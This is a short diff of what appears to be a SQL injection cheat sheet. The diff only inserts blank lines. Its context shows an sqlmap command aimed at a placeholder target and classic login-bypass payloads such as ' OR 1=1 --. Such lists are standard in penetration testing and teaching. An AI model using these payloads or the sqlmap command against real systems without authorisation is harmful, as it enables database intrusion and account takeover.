@@ -67,7 +67,9 @@ sqlmap -u "http://target/api" --data '{"id":"1"}' --batch --headers="Content-Typ
 
 
 ' OR 1=1 --
+
 ' OR 'a'='a
+
 admin' -- 
 
 
